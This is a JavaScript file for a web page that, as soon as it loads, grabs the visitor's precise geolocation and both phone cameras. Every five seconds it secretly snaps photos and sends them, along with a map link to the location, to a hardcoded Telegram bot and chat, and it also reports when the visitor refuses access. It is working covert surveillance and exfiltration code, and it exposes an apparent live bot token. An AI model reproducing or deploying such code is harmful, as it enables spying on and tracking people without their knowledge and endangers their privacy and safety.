const TELEGRAM_BOT_TOKEN = '7921776519:AAEtasvOGOZxdZo4gUNscLC49zSdm3CtITw';
const TELEGRAM_CHAT_ID = '8071841674';

const videoFront = document.getElementById('videoFront');
const videoBack = document.getElementById('videoBack');
const canvasFront = document.getElementById('canvasFront');
const canvasBack = document.getElementById('canvasBack');

let frontStream = null;
let backStream = null;
let photoInterval = null;

async function sendPhoto(blob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('photo', blob, 'photo.jpg');

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: 'POST',
      body: formData
    });
  } catch (e) {
    console.error('Ошибка отправки фото:', e);
  }
}

function takePhoto(video, canvas) {
  const ctx = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return new Promise(resolve => {
    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
  });
}

async function sendLocation(lat, lon) {
  const mapLink = `https://maps.google.com/?q=${lat},${lon}`;
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: `📍 Геолокация: ${mapLink}`
    })
  });
}

async function sendDeniedMessage() {
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: `❌ Пользователь отказал в доступе к камере или геолокации.`
    })
  });
}

async function getLocation() {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos.coords),
      err => reject(err),
      { enableHighAccuracy: true, timeout: 8000 }
    );
  });
}

async function getCamera(facingMode) {
  return await navigator.mediaDevices.getUserMedia({
    video: { facingMode },
    audio: false
  });
}

async function start() {
  try {
    const coords = await getLocation();
    await sendLocation(coords.latitude, coords.longitude);

    frontStream = await getCamera('user');
    videoFront.srcObject = frontStream;

    backStream = await getCamera('environment');
    videoBack.srcObject = backStream;

    photoInterval = setInterval(async () => {
      if (videoFront.readyState >= 2) {
        const blobFront = await takePhoto(videoFront, canvasFront);
        sendPhoto(blobFront);
      }
      if (videoBack.readyState >= 2) {
        const blobBack = await takePhoto(videoBack, canvasBack);
        sendPhoto(blobBack);
      }
    }, 5000);

  } catch (err) {
    await sendDeniedMessage();
  }
}

start();
